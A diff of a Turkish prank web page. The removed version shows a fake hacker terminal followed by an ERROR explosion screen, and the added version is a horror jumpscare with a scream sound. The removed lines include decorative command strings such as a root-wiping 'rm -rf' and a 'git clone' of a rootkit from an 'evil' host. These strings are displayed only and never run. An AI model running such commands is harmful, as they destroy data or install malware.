@@ -1,257 +1,109 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Terminal & ERROR Efekti</title>
-<style>
-  body, html {
-    margin:0; padding:0;
-    background:#000; color:#0f0;
-    font-family: monospace;
-    overflow: hidden;
-    height: 100vh;
-  }
-  #startBtn {
-    position: fixed;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 6rem;
-    color: red;
-    background: transparent;
-    border: none;
-    cursor: pointer;
-    user-select: none;
-    z-index: 1000;
-  }
-  #terminals {
-    position: fixed;
-    top: 10%; left: 5%;
-    width: 90%;
-    height: 70%;
-    display: flex;
-    justify-content: space-between;
-    pointer-events: none;
-  }
-  .terminal {
-    background: #111;
-    border: 2px solid #0f0;
-    width: 48%;
-    height: 100%;
-    color: #0f0;
-    padding: 10px;
-    overflow-y: auto;
-    box-sizing: border-box;
-    font-size: 14px;
-    user-select:none;
-  }
-  .mini-box {
-    position: absolute;
-    width: 20px;
-    height: 20px;
-    background: lime;
-    border: 1px solid #0f0;
-    animation: flicker 1s infinite alternate;
-    border-radius: 3px;
-    opacity: 0.8;
-    user-select:none;
-  }
-  @keyframes flicker {
-    from {opacity: 0.3;}
-    to {opacity: 1;}
-  }
-  #errorScreen {
-    position: fixed;
-    top:0; left:0; width:100%; height:100%;
-    background: red;
-    color: black;
-    font-size: 5rem;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    opacity: 0;
-    pointer-events: none;
-    user-select:none;
-    z-index: 2000;
-  }
-  #errorScreen.show {
-    animation: fadeIn 1s forwards;
-    pointer-events: all;
-  }
-  @keyframes fadeIn {
-    to {opacity: 1;}
-  }
-  #boomText {
-    margin-top: 2rem;
-    font-size: 3rem;
-    color: black;
-    text-shadow: 0 0 10px yellow;
-    animation: popIn 1s ease forwards;
-  }
-  @keyframes popIn {
-    0% {transform: scale(0);}
-    100% {transform: scale(1);}
-  }
-  /* Basit bomba patlama efekti */
-  #boomEffect {
-    position: absolute;
-    width: 100px;
-    height: 100px;
-    background: radial-gradient(circle, yellow 20%, orange 60%, transparent 80%);
-    border-radius: 50%;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    opacity: 0.8;
-    pointer-events: none;
-    animation: boomAnim 1s forwards;
-  }
-  @keyframes boomAnim {
-    0% {transform: translate(-50%, -50%) scale(0); opacity: 0.8;}
-    100% {transform: translate(-50%, -50%) scale(3); opacity: 0;}
-  }
-</style>
+  <meta charset="UTF-8" />
+  <title>Karanlık Korku</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      background: black;
+      color: #0f0;
+      font-family: monospace;
+      overflow: hidden;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #startBtn {
+      font-size: 6rem;
+      color: red;
+      background: none;
+      border: none;
+      cursor: pointer;
+      z-index: 10;
+      user-select: none;
+    }
+
+    #mhmtBox {
+      display: none;
+      font-size: 3rem;
+      color: #0f0;
+      border: 2px solid #0f0;
+      padding: 1rem 2rem;
+      z-index: 5;
+      position: absolute;
+    }
+
+    #scareImg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      object-fit: cover;
+      display: none;
+      z-index: 9999;
+    }
+
+    @keyframes flicker {
+      0% {opacity: 1;}
+      50% {opacity: 0.3;}
+      100% {opacity: 1;}
+    }
+  </style>
 </head>
 <body>
 
 <button id="startBtn">✖</button>
-
-<div id="terminals" style="display:none;">
-  <div id="terminal1" class="terminal"></div>
-  <div id="terminal2" class="terminal"></div>
-</div>
-
-<div id="errorScreen">
-  <div>!!! ERROR !!!</div>
-  <div id="boomText">Yok artık!</div>
-  <div id="boomEffect"></div>
-</div>
+<div id="mhmtBox">@mhmtxaslan</div>
+<img id="scareImg" src="https://i.imgur.com/Zd0AjJR.jpg" alt="screamer" />
 
 <script>
   const startBtn = document.getElementById('startBtn');
-  const terminals = document.getElementById('terminals');
-  const terminal1 = document.getElementById('terminal1');
-  const terminal2 = document.getElementById('terminal2');
-  const errorScreen = document.getElementById('errorScreen');
-  const boomText = document.getElementById('boomText');
-  const boomEffect = document.getElementById('boomEffect');
+  const mhmtBox = document.getElementById('mhmtBox');
+  const scareImg = document.getElementById('scareImg');
 
-  // Ses dosyası (alarm)
-  const alarmSound = new Audio('https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg');
-  alarmSound.loop = true;
+  // Sesler
+  const ambient = new Audio('https://cdn.pixabay.com/download/audio/2023/03/15/audio_e5ae6aee4d.mp3?filename=deep-horror-drones-142778.mp3');
+  const scream = new Audio('https://www.myinstants.com/media/sounds/scream.mp3');
 
-  let miniBoxes = [];
+  ambient.loop = true;
+  ambient.volume = 0.5;
 
   startBtn.addEventListener('click', async () => {
     try {
-      await alarmSound.play();
+      await ambient.play();
 
       startBtn.style.display = 'none';
-      terminals.style.display = 'flex';
+      mhmtBox.style.display = 'block';
 
-      // Başlayalım: terminal yazılarını ekle
-      startTerminals();
-
-      // Küçük kutuları yarat ve rastgele hareket ettir
-      createMiniBoxes(20);
-
-      // 25 saniye sonra error ekranı aç ve bomba efektini göster
+      // 10. saniyede ekran kararmaya başlar
       setTimeout(() => {
-        showErrorScreen();
+        document.body.style.background = "#111";
+        document.body.style.animation = "flicker 0.2s infinite";
+        mhmtBox.style.color = "red";
+      }, 10000);
+
+      // 25. saniyede ekran titrer, kutu silinir
+      setTimeout(() => {
+        mhmtBox.style.display = 'none';
+        document.body.style.background = "black";
+        document.body.style.animation = "none";
       }, 25000);
 
-    } catch (e) {
-      alert("Ses oynatılamadı. Tarayıcı izinlerini kontrol edin.");
-      console.error(e);
+      // 29. saniyede aniden korku görüntüsü ve çığlık
+      setTimeout(() => {
+        ambient.pause();
+        scareImg.style.display = 'block';
+        scream.play();
+        document.body.style.background = "black";
+      }, 29000);
+
+    } catch (err) {
+      alert("Ses izni reddedildi. Lütfen tekrar tıkla.");
+      console.error(err);
     }
   });
-
-  function startTerminals() {
-    const commands = [
-      "ping 127.0.0.1 -t",
-      "sudo rm -rf / --no-preserve-root",
-      "git clone http://evil.git/rootkit",
-      "nmap -sS 192.168.1.0/24",
-      "tracert 10.0.0.1",
-      "inject payload into memory",
-      "echo HACKED > C:\\system32\\boot.ini"
-    ];
-    let count = 0;
-    const maxLines = 50;
-
-    const interval = setInterval(() => {
-      const cmd = commands[Math.floor(Math.random() * commands.length)];
-      terminal1.innerHTML += cmd + "\n";
-      terminal2.innerHTML += "% " + cmd + "\n";
-
-      terminal1.scrollTop = terminal1.scrollHeight;
-      terminal2.scrollTop = terminal2.scrollHeight;
-
-      count++;
-      if (count >= maxLines) clearInterval(interval);
-    }, 150);
-  }
-
-  function createMiniBoxes(num) {
-    for(let i=0; i<num; i++) {
-      const box = document.createElement('div');
-      box.className = 'mini-box';
-      resetBoxPosition(box);
-      document.body.appendChild(box);
-      miniBoxes.push(box);
-    }
-    animateMiniBoxes();
-  }
-
-  function resetBoxPosition(box) {
-    box.style.top = (Math.random() * window.innerHeight) + 'px';
-    box.style.left = (Math.random() * window.innerWidth) + 'px';
-  }
-
-  function animateMiniBoxes() {
-    miniBoxes.forEach(box => {
-      const deltaX = (Math.random() - 0.5) * 3;
-      const deltaY = (Math.random() - 0.5) * 3;
-
-      let top = parseFloat(box.style.top);
-      let left = parseFloat(box.style.left);
-
-      top += deltaY;
-      left += deltaX;
-
-      if(top < 0) top = window.innerHeight;
-      if(top > window.innerHeight) top = 0;
-      if(left < 0) left = window.innerWidth;
-      if(left > window.innerWidth) left = 0;
-
-      box.style.top = top + 'px';
-      box.style.left = left + 'px';
-    });
-
-    requestAnimationFrame(animateMiniBoxes);
-  }
-
-  function showErrorScreen() {
-    // Mini kutuları kaldır
-    miniBoxes.forEach(box => box.remove());
-    miniBoxes = [];
-
-    // Terminals sabit kalsın istersen commentle aşağı satırı
-    terminals.style.display = 'none';
-
-    // ERROR ekranı göster
-    errorScreen.classList.add('show');
-
-    // Bomba patlama animasyonunu başlat
-    boomEffect.style.animation = 'boomAnim 1s forwards';
-
-    // 1.5 saniye sonra "Yok artık!" yazısını biraz daha vurgula
-    setTimeout(() => {
-      boomText.style.color = 'yellow';
-      boomText.style.textShadow = '0 0 20px yellow';
-    }, 1500);
-  }
 </script>
 
 </body>
